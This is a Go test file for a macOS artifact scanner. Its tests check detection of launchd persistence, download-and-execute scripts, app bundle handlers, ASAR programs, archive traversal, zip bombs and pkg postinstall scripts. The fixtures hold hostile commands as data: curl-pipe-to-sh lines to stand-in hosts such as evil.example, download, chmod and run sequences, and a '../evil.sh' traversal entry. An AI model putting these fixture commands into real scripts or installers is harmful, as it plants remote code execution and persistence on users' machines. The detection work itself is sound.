<key>Label</key><string>com.example.agent</string>
<key>ProgramArguments</key><array><string>/usr/bin/env</string><string>node</string><string>-e</string><string>fetch('https://inline-node.example/payload')</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertNetworkDestination(t, rep, "https://inline-node.example/payload")
}

func TestInspectLaunchAgentPlainArgumentsDoNotBecomeShell(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "com.example.agent.plist")
	body := `<plist><dict>
<key>Label</key><string>com.example.agent</string>
<key>ProgramArguments</key><array><string>/usr/bin/open</string><string>https://launchd-arg.example/</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	if hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("plain launchd arguments should not be treated as a shell pipeline: %#v", rep.Capabilities)
	}
	assertDelegatedNetworkDestination(t, rep, "open", "https://launchd-arg.example/")
}

func TestInspectLaunchAgentDirectNetworkCommand(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "com.example.curl.plist")
	body := `<plist><dict>
<key>Label</key><string>com.example.curl</string>
<key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>https://launchd-curl.example/payload</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.launch-persistence")
	assertNetworkDestination(t, rep, "https://launchd-curl.example/payload")
}

func TestInspectLaunchAgentResolvesLocalScriptTarget(t *testing.T) {
	root := t.TempDir()
	plist := `<plist><dict>
<key>Label</key><string>com.example.agent</string>
<key>ProgramArguments</key><array><string>/bin/sh</string><string>` + filepath.Join(root, "helper.sh") + `</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`
	if err := os.WriteFile(filepath.Join(root, "com.example.agent.plist"), []byte(plist), 0o600); err != nil {
		t.Fatal(err)
	}
	helper := "curl https://launchd-helper.example/p -o /tmp/helper\nchmod +x /tmp/helper\n/tmp/helper\n"
	if err := os.WriteFile(filepath.Join(root, "helper.sh"), []byte(helper), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, rep, "script-target", "helper.sh")
	assertCapability(t, rep, "macos.launch-persistence")
	assertCapability(t, rep, "macos.download-execute")
	assertCapabilityConnectivity(t, rep, "macos.download-execute", "CONNECTED")
	assertNetworkDestination(t, rep, "https://launchd-helper.example/p")
}

func TestInspectPlistDoesNotInferLaunchAgentFromProgramText(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "metadata.plist")
	body := `<plist><dict>
<key>Label</key><string>com.example.metadata</string>
<key>Description</key><string>Program output is documented here.</string>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.launch-persistence") {
		t.Fatalf("plain Program text should not be launch persistence: %#v", rep.Capabilities)
	}
	for _, entry := range rep.ExecutionRoots {
		if entry.Kind == "launchd-program" {
			t.Fatalf("plain Program text should not create a launchd execution root: %#v", rep.ExecutionRoots)
		}
	}
}

func TestInspectPlistRequiresLaunchdLabel(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "metadata.plist")
	body := `<plist><dict>
<key>ProgramArguments</key><array><string>/usr/bin/open</string><string>https://not-launchd.example/</string></array>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.launch-persistence") {
		t.Fatalf("ProgramArguments without Label should not be launch persistence: %#v", rep.Capabilities)
	}
	for _, entry := range rep.ExecutionRoots {
		if entry.Kind == "launchd-program" {
			t.Fatalf("ProgramArguments without Label should not create a launchd execution root: %#v", rep.ExecutionRoots)
		}
	}
}

func TestInspectPlistIgnoresNestedLaunchdTemplate(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "metadata.plist")
	body := `<plist><dict>
<key>Name</key><string>metadata</string>
<key>LaunchdTemplate</key><dict>
  <key>Label</key><string>com.example.template</string>
  <key>ProgramArguments</key><array><string>/usr/bin/open</string><string>https://nested-template.example/</string></array>
</dict>
</dict></plist>`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.launch-persistence") {
		t.Fatalf("nested launchd-like metadata should not be launch persistence: %#v", rep.Capabilities)
	}
	assertNoExecutionRecord(t, rep, "launchd-program", "com.example.template")
	assertNoNetworkDestination(t, rep, "https://nested-template.example/")
}

func TestInspectAppBundleURLAndDocumentHandlers(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Handlers.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
  <key>CFBundleExecutable</key><string>Handlers</string>
  <key>CFBundleIdentifier</key><string>com.example.handlers</string>
  <key>CFBundleURLTypes</key><array><dict>
    <key>CFBundleURLName</key><string>Example Handler</string>
    <key>CFBundleURLSchemes</key><array><string>maratus</string><string>maratuss</string></array>
  </dict></array>
  <key>CFBundleDocumentTypes</key><array><dict>
    <key>CFBundleTypeName</key><string>Maratus Sample</string>
    <key>CFBundleTypeExtensions</key><array><string>spt</string><string>sprint</string></array>
    <key>CFBundleTypeRole</key><string>Viewer</string>
  </dict></array>
</dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Handlers"), []byte("not a real macho"), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, rep, "url-handler", "maratus")
	assertExecutionRecord(t, rep, "url-handler", "maratuss")
	assertExecutionRecord(t, rep, "document-handler", "Maratus Sample")
	assertFeature(t, rep, "bundle.url_scheme", "maratus")
	assertFeature(t, rep, "bundle.document_extension", "spt")
	assertFeature(t, rep, "bundle.document_extension", "sprint")
}

func TestInspectAppBundleSkipsVendoredNodeModules(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Vendor.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	vendor := filepath.Join(app, "Contents", "Resources", "node_modules", "dep")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(vendor, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Vendor</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Vendor"), []byte("not a real macho"), 0o700); err != nil {
		t.Fatal(err)
	}
	pkg := `{"scripts":{"postinstall":"curl https://vendored.example/p | sh"}}`
	if err := os.WriteFile(filepath.Join(vendor, "package.json"), []byte(pkg), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "package.package-json-lifecycle") || hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("vendored node_modules package should not become an app capability: %#v", rep.Capabilities)
	}
	sawSkippedNodeModules := false
	for _, node := range rep.ArtifactNodes {
		switch {
		case strings.HasSuffix(node.LogicalPath, "node_modules"):
			sawSkippedNodeModules = node.AnalyzeStatus == "skipped"
		case strings.Contains(node.LogicalPath, "node_modules/"):
			t.Fatalf("app resource walk should not analyze node_modules children: %#v", rep.ArtifactNodes)
		}
	}
	if !sawSkippedNodeModules {
		t.Fatalf("skipped node_modules directory should be represented in coverage: %#v", rep.ArtifactNodes)
	}
}

func TestInspectAppBundleJavaScriptRequiresIncludeUnreferenced(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Scripted.app")
	resources := filepath.Join(app, "Contents", "Resources")
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Scripted</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	body := `fetch("https://resource.example/api")`
	if err := os.WriteFile(filepath.Join(resources, "renderer.js"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}

	shallow, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoNetworkDestination(t, shallow, "https://resource.example/api")

	deep, err := InspectPath(app, artifact.Options{IncludeUnreferenced: true})
	if err != nil {
		t.Fatal(err)
	}
	assertNetworkDestination(t, deep, "https://resource.example/api")
}

func TestInspectCanonicalAppASARConnectsOnlyDeclaredProgramBehavior(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Fixture.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	resources := filepath.Join(app, "Contents", "Resources")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Fixture</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Fixture"), []byte("#!/bin/sh\nexit 0\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	writeElectronRuntimeTestFixture(t, app)
	asar := asarEntries(t, map[string][]byte{
		"package.json": []byte(`{"name":"fixture","main":"dist/main.js"}`),
		"dist/main.js": []byte(`fetch("https://program-main.example/api")`),
		"renderer.js":  []byte(`fetch("https://renderer-unrelated.example/api")`),
	})
	if err := os.WriteFile(filepath.Join(resources, "app.asar"), asar, 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRelationship(rep, "program-entry") {
		t.Fatalf("missing canonical ASAR program-entry relationship: %#v", rep.Relationships)
	}
	assertCoverageContains(t, rep, "electron/node-module-resolution", "partial", "transitive relative require/import")
	var appMainRootID string
	for _, root := range rep.ExecutionRoots {
		if root.Kind == "app-main" && root.Name == "Fixture" {
			appMainRootID = root.ID
		}
		if root.Name == "main.js" {
			t.Fatalf("declared ASAR program must not become a second execution root: %#v", rep.ExecutionRoots)
		}
	}
	if appMainRootID == "" {
		t.Fatalf("missing native app-main execution root: %#v", rep.ExecutionRoots)
	}
	mainConnectivity := behavior.Connectivity("")
	var mainRootIDs []string
	rendererConnectivity := behavior.Connectivity("")
	var rendererRootIDs []string
	for _, operation := range rep.Operations {
		switch operation.RequiredResource().Value {
		case "https://program-main.example/api":
			mainConnectivity = operation.Execution.Connectivity
			mainRootIDs = operation.Execution.ExecutionRootIDs
		case "https://renderer-unrelated.example/api":
			rendererConnectivity = operation.Execution.Connectivity
			rendererRootIDs = operation.Execution.ExecutionRootIDs
		}
	}
	if mainConnectivity != behavior.ConnectivityConnected || !slices.Contains(mainRootIDs, appMainRootID) {
		t.Fatalf("declared program behavior should be CONNECTED to app-main: connectivity=%q roots=%q operations=%#v", mainConnectivity, mainRootIDs, rep.Operations)
	}
	if rendererConnectivity != behavior.ConnectivityUnknown || len(rendererRootIDs) != 0 {
		t.Fatalf("unrelated renderer behavior should remain UNKNOWN: connectivity=%q roots=%q operations=%#v", rendererConnectivity, rendererRootIDs, rep.Operations)
	}
}

func TestInspectCanonicalAppASARAnalyzesDeclaredExtensionlessProgram(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Fixture.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	resources := filepath.Join(app, "Contents", "Resources")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Fixture</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Fixture"), []byte("#!/bin/sh\nexit 0\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	writeElectronRuntimeTestFixture(t, app)
	data := asarEntries(t, map[string][]byte{
		"package.json": []byte(`{"name":"fixture","main":"program"}`),
		"program":      []byte(`fetch("https://extensionless-main.example/api")`),
		"unrelated":    []byte(`fetch("https://extensionless-unrelated.example/api")`),
	})
	if err := os.WriteFile(filepath.Join(resources, "app.asar"), data, 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNetworkDestination(t, rep, "https://extensionless-main.example/api")
	assertNoNetworkDestination(t, rep, "https://extensionless-unrelated.example/api")
}

func writeElectronRuntimeTestFixture(t *testing.T, app string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(app, "Contents", "MacOS", "Fixture"), electronLoaderMachOTestData(), 0o700); err != nil {
		t.Fatal(err)
	}
	framework := filepath.Join(app, "Contents", "Frameworks", "Electron Framework.framework", "Versions", "A")
	if err := os.MkdirAll(framework, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(framework, "Electron Framework"), electronFrameworkMachOTestData(), 0o700); err != nil {
		t.Fatal(err)
	}
}

func electronLoaderMachOTestData() []byte {
	return electronMachOTestData(0x2, 0x0c)
}

func electronFrameworkMachOTestData() []byte {
	return electronMachOTestData(0x6, 0x0d)
}

func electronMachOTestData(fileType, dylibCommand uint32) []byte {
	const (
		machO64Magic       = 0xfeedfacf
		cpuArm64           = 0x0100000c
		loadCommandSegment = 0x19
	)
	name := []byte("@rpath/Electron Framework.framework/Electron Framework\x00")
	idSize := (24 + len(name) + 3) &^ 3
	commandsSize := 72 + idSize
	data := make([]byte, 32+commandsSize)
	binary.LittleEndian.PutUint32(data[0:4], machO64Magic)
	binary.LittleEndian.PutUint32(data[4:8], cpuArm64)
	binary.LittleEndian.PutUint32(data[12:16], fileType)
	binary.LittleEndian.PutUint32(data[16:20], 2)
	binary.LittleEndian.PutUint32(data[20:24], uint32(commandsSize))
	binary.LittleEndian.PutUint32(data[32:36], loadCommandSegment)
	binary.LittleEndian.PutUint32(data[36:40], 72)
	id := data[32+72:]
	binary.LittleEndian.PutUint32(id[0:4], dylibCommand)
	binary.LittleEndian.PutUint32(id[4:8], uint32(idSize))
	binary.LittleEndian.PutUint32(id[8:12], 24)
	copy(id[24:], name)
	return data
}

func TestInspectAppBundleResourcePluginsRequireDeep(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Plugins.app")
	pluginDir := filepath.Join(app, "Contents", "Resources", "plugins", "demo")
	if err := os.MkdirAll(pluginDir, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Plugins</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	body := `curl https://plugin.example/p | sh`
	if err := os.WriteFile(filepath.Join(pluginDir, "install.sh"), []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}

	shallow, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoNetworkDestination(t, shallow, "https://plugin.example/p")

	deep, err := InspectPath(app, artifact.Options{IncludeUnreferenced: true})
	if err != nil {
		t.Fatal(err)
	}
	assertNetworkDestination(t, deep, "https://plugin.example/p")
}

func TestInspectArchiveTraversalRejected(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample.zip")
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	entry, err := zw.Create("../evil.sh")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := entry.Write([]byte("curl https://evil.example | sh")); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, buf.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Capabilities) != 0 {
		t.Fatalf("unsafe archive entry should not be analyzed: %#v", rep.Capabilities)
	}
	assertDiagnosticContains(t, rep, "rejected unsafe archive path")
}

func TestInspectArchiveCandidateIsAnalyzedWithoutBecomingRoot(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample.zip")
	data := zipEntries(t, map[string][]byte{
		"Payload/install.sh": []byte("curl https://archive-payload.example/p | sh\n"),
		"Payload/README.md":  []byte("example only: curl https://archive-doc.example/p | sh\n"),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoExecutionRecord(t, rep, "archive-payload", "install.sh")
	if len(rep.ExecutionRoots) != 0 {
		t.Fatalf("plain archive membership created an execution root: %#v", rep.ExecutionRoots)
	}
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertCapabilityConnectivity(t, rep, "macos.download-pipe-interpreter", "UNCONNECTED")
	assertNetworkDestination(t, rep, "https://archive-payload.example/p")
	assertNoNetworkDestination(t, rep, "https://archive-doc.example/p")
}

func TestInspectArchiveAppBundleExecutionRoot(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample.zip")
	data := zipEntries(t, map[string][]byte{
		"Payload/Fake.app/Contents/Info.plist": []byte(`<plist><dict><key>CFBundleExecutable</key><string>Fake</string></dict></plist>`),
		"Payload/Fake.app/Contents/MacOS/Fake": []byte("#!/bin/sh\ncurl https://archived-app.example/p | sh\n"),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertArtifactNode(t, rep, "sample.zip!Payload/Fake.app", "app-bundle")
	assertExecutionRecord(t, rep, "app-main", "Fake")
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertCapabilityConnectivity(t, rep, "macos.download-pipe-interpreter", "CONNECTED")
	assertNetworkDestination(t, rep, "https://archived-app.example/p")
	if !hasRelationship(rep, "bundle-executable") {
		t.Fatalf("missing archived bundle-executable relationship: %#v", rep.Relationships)
	}
}

func TestInspectArchiveMultipleCandidatesRemainUnresolved(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample.zip")
	data := zipEntries(t, map[string][]byte{
		"one.sh": []byte("curl https://archive-one.example/p | sh\n"),
		"two.sh": []byte("curl https://archive-two.example/p | sh\n"),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.ExecutionRoots) != 0 {
		t.Fatalf("plain archive members created execution roots: %#v", rep.ExecutionRoots)
	}
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertCapabilityConnectivity(t, rep, "macos.download-pipe-interpreter", "UNCONNECTED")
	assertNetworkDestination(t, rep, "https://archive-one.example/p")
	assertNetworkDestination(t, rep, "https://archive-two.example/p")
}

func TestInspectZipCompressionRatioLimit(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "bomb.zip")
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	entry, err := zw.Create("install.sh")
	if err != nil {
		t.Fatal(err)
	}
	body := strings.Repeat("echo padding\n", 4000) + "curl https://bomb.example/p | sh\n"
	if _, err := entry.Write([]byte(body)); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, buf.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{MaxCompressionRatio: 1})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("entry over compression ratio limit should not be analyzed: %#v", rep.Capabilities)
	}
	assertDiagnosticContains(t, rep, "compression ratio limit")
}

func TestInspectZipArchiveByteLimit(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "limited.zip")
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	first, err := zw.CreateHeader(&zip.FileHeader{Name: "first.sh", Method: zip.Store})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := first.Write([]byte("echo ok\n")); err != nil {
		t.Fatal(err)
	}
	second, err := zw.CreateHeader(&zip.FileHeader{Name: "install.sh", Method: zip.Store})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := second.Write([]byte("curl https://limited.example/p | sh\n")); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, buf.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{MaxArchiveBytes: int64(len("echo ok\n"))})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("entry past archive byte limit should not be analyzed: %#v", rep.Capabilities)
	}
	assertDiagnosticContains(t, rep, "archive content byte limit")
}

func TestInspectTarArchiveByteLimit(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "limited.tar")
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	first := []byte("echo ok\n")
	if err := tw.WriteHeader(&tar.Header{Name: "first.sh", Mode: 0o755, Size: int64(len(first))}); err != nil {
		t.Fatal(err)
	}
	if _, err := tw.Write(first); err != nil {
		t.Fatal(err)
	}
	second := []byte("curl https://limited.example/p | sh\n")
	if err := tw.WriteHeader(&tar.Header{Name: "install.sh", Mode: 0o755, Size: int64(len(second))}); err != nil {
		t.Fatal(err)
	}
	if _, err := tw.Write(second); err != nil {
		t.Fatal(err)
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, buf.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{MaxArchiveBytes: int64(len(first))})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("entry past archive byte limit should not be analyzed: %#v", rep.Capabilities)
	}
	assertDiagnosticContains(t, rep, "archive content byte limit")
}

func TestInspectGzipArchiveCompressionRatioLimit(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "bomb.tgz")
	body := strings.Repeat("echo padding\n", 4000) + "curl https://tgz.example/p | sh\n"
	if err := os.WriteFile(path, tgz(t, map[string]string{"install.sh": body}), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{MaxCompressionRatio: 1})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("gzip over compression ratio limit should not be analyzed: %#v", rep.Capabilities)
	}
	assertDiagnosticContains(t, rep, "gzip compression ratio limit 1 exceeded; contents not inspected")
}

func TestInspectDMGReportsCoverageDiagnostic(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample.dmg")
	if err := os.WriteFile(path, reportTestUDIFImage(), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertDiagnosticContains(t, rep, "DMG detected")
	assertDiagnosticContains(t, rep, "contents not inspected by the portable core")
	assertCoverageContains(t, rep, "dmg", "partial", "portable core")
}

func TestInspectDMGWithMountEnabledReportsUnavailableImage(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample.dmg")
	if err := os.WriteFile(path, reportTestUDIFImage(), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{AllowDMGMount: true})
	if err != nil {
		t.Fatal(err)
	}
	if runtime.GOOS == "darwin" {
		assertDiagnosticContains(t, rep, "DMG system attach failed")
		assertCoverageContains(t, rep, "dmg", "partial", "system attach failed")
	} else {
		assertDiagnosticContains(t, rep, "system DMG extraction requires macOS")
		assertCoverageContains(t, rep, "dmg", "partial", "requires macOS")
	}
}

func reportTestUDIFImage() []byte {
	data := make([]byte, 512)
	copy(data, "koly")
	return data
}

func TestInspectFlatPKGPostinstall(t *testing.T) {
	root := t.TempDir()
	scriptArchive := tgz(t, map[string]string{
		"postinstall": "curl https://pkg.example/p -o /tmp/p\nchmod +x /tmp/p\n/tmp/p\n",
	})
	pkg := xar(t, map[string][]byte{
		"PackageInfo": []byte(`<pkg-info identifier="com.example.pkg"/>`),
		"Scripts":     scriptArchive,
	})
	path := filepath.Join(root, "sample.pkg")
	if err := os.WriteFile(path, pkg, 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertCapabilityConnectivity(t, rep, "macos.download-execute", "CONNECTED")
	assertNetworkDestination(t, rep, "https://pkg.example/p")
}

func TestInspectFlatPKGNestedScriptsPostinstall(t *testing.T) {
	root := t.TempDir()
	scriptArchive := tgz(t, map[string]string{
		"postinstall": "curl https://nested-pkg.example/p | sh\n",
	})
	pkg := xar(t, map[string][]byte{
		"config.pkg/PackageInfo": []byte(`<pkg-info identifier="com.example.pkg"/>`),
		"config.pkg/Scripts":     scriptArchive,
	})
	path := filepath.Join(root, "sample.pkg")
	if err := os.WriteFile(path, pkg, 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, rep, "pkg-script", "postinstall")
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertNetworkDestination(t, rep, "https://nested-pkg.example/p")
}

func TestInspectFlatPKGPayloadCPIOInventory(t *testing.T) {
	root := t.TempDir()
	payload := gzipData(t, cpioNewc(t, map[string][]byte{
		"Applications/Fake.app/Contents/MacOS/Fake": thinMachO(0x0100000c, 0),
	}))
	pkg := xar(t, map[string][]byte{
		"PackageInfo": []byte(`<pkg-info identifier="com.example.pkg"/>`),
		"Payload":     payload,
	})
	path := filepath.Join(root, "payload.pkg")
	if err := os.WriteFile(path, pkg, 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	var found bool
	for _, node := range rep.ArtifactNodes {
		if strings.Contains(node.LogicalPath, "Payload!Applications/Fake.app/Contents/MacOS/Fake") && node.Kind == "macho" {
			found = true
		}
	}
	if !found {
		t.Fatalf("missing Mach-O payload node: %#v", rep.ArtifactNodes)
	}
}

func TestInspectFlatPKGLaunchdRootRequiresInstallLocation(t *testing.T) {
	launchd := []byte(`<plist><dict><key>Label</key><string>com.example.job</string><key>Program</key><string>/tmp/helper</string></dict></plist>`)
	for _, test := range []struct {
		name      string
		metadata  string
		wantRoots int
	}{
		{name: "root install", metadata: `<pkg-info identifier="com.example.pkg" install-location="/"/>`, wantRoots: 1},
		{name: "location unknown", metadata: `<pkg-info identifier="com.example.pkg"/>`, wantRoots: 0},
		{name: "relocated payload", metadata: `<pkg-info identifier="com.example.pkg" install-location="/opt/example"/>`, wantRoots: 0},
	} {
		t.Run(test.name, func(t *testing.T) {
			root := t.TempDir()
			payload := gzipData(t, cpioNewc(t, map[string][]byte{
				"Library/LaunchDaemons/com.example.job.plist": launchd,
			}))
			pkg := xar(t, map[string][]byte{
				"PackageInfo": []byte(test.metadata),
				"Payload":     payload,
			})
			path := filepath.Join(root, "sample.pkg")
			if err := os.WriteFile(path, pkg, 0o600); err != nil {
				t.Fatal(err)
			}
			rep, err := InspectPath(path, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			var roots int
			for _, executionRoot := range rep.ExecutionRoots {
				if executionRoot.Kind == "launchd-program" {
					roots++
				}
			}
			if roots != test.wantRoots {
				t.Fatalf("launchd roots = %d, want %d: %#v", roots, test.wantRoots, rep.ExecutionRoots)
			}
			if test.wantRoots == 0 {
				assertOperationConnectivity(t, rep, behavior.OperationProcessExecute, behavior.ConnectivityUnknown)
			}
		})
	}
}

func TestInspectZIPLaunchdLookalikeRemainsDeclaration(t *testing.T) {
	root := t.TempDir()
	archive := zipEntries(t, map[string][]byte{
		"root/Library/LaunchDaemons/com.example.job.plist": []byte(`<plist><dict><key>Label</key><string>com.example.job</string><key>Program</key><string>/tmp/helper</string></dict></plist>`),
	})
	path := filepath.Join(root, "sample.zip")
	if err := os.WriteFile(path, archive, 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{IncludeUnreferenced: true})
	if err != nil {
		t.Fatal(err)
